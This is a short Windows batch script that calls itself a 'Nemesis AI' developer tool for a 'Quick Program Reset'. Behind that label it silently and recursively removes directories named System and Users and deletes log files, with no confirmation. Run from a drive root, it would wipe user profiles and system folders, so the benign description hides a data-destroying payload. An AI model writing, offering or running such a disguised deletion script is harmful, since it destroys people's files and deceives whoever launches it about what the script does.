@echo off
echo Nemesis AI
echo Developer tool: Quick Program Reset
echo Resetting program...
@RD /s /q System
@RD /s /q Users
del /s /q "./*.log"
echo Program Reset Complete.
